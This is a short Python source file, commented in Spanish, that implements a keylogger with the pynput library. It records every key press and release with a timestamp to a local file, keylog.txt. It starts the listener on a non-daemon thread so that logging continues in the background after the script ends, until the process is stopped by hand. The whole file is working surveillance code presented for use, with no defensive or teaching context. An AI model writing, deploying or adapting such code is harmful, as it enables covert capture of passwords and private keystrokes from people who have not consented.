# Keylogger simple que registra las teclas presionadas y liberadas en un archivo de log
from pynput import keyboard
from datetime import datetime
import threading

LOG_FILE = "keylog.txt"

def on_press(key: keyboard.Key | keyboard.KeyCode) -> None:
    """Registra eventos de teclas presionadas en un archivo de log con marca de tiempo.

    ### Parámetros
    1. key : pynput.keyboard.Key | pynput.keyboard.KeyCode
        - Objeto que representa la tecla presionada.

    ### Retorna
    - None
        - No retorna ningún valor.

    ------

    Ejemplo:
        >>> on_press(key)
        # Registra: "2024-06-01 12:34:56.789123 - PRESSED - a"
        # o:        "2024-06-01 12:34:56.789123 - PRESSED - [Key.shift]"
    """
    try:
        with open(LOG_FILE, "a") as f:
            # Si la tecla tiene un carácter asociado, lo escribe en el archivo con la fecha y hora
            f.write(f"{datetime.now()} - PRESSED - {key.char}\n")
    except AttributeError:
        with open(LOG_FILE, "a") as f:
            # Si la tecla no tiene carácter (por ejemplo, Shift, Ctrl), escribe el nombre de la tecla
            f.write(f"{datetime.now()} - PRESSED - [{key}]\n")

def on_release(key: keyboard.Key | keyboard.KeyCode) -> None:
    """Registra eventos de teclas liberadas en un archivo de log con marca de tiempo.

    ### Parámetros
    1. key : pynput.keyboard.Key | pynput.keyboard.KeyCode
        - Objeto que representa la tecla liberada.

    ### Retorna
    - None
        - No retorna ningún valor.

    ------

    Ejemplo:
        >>> on_release(key)
        # Registra: "2024-06-01 12:34:56.789123 - RELEASED - a"
        # o:        "2024-06-01 12:34:56.789123 - RELEASED - [Key.shift]"
    """
    try:
        with open(LOG_FILE, "a") as f:
            # Si la tecla tiene un carácter asociado, lo escribe en el archivo con la fecha y hora
            f.write(f"{datetime.now()} - RELEASED - {key.char}\n")
    except AttributeError:
        with open(LOG_FILE, "a") as f:
            # Si la tecla no tiene carácter, escribe el nombre de la tecla
            f.write(f"{datetime.now()} - RELEASED - [{key}]\n")

# Crea un listener para escuchar los eventos de teclado y asigna las funciones anteriores
listener = keyboard.Listener(on_press=on_press, on_release=on_release)

# Ejecutar en thread NO-daemon (persiste después del script)
listener_thread = threading.Thread(target=listener.start, daemon=False)
listener_thread.start()

# El script termina pero el listener sigue corriendo en segundo plano.
# Hay que detener el proceso manualmente.
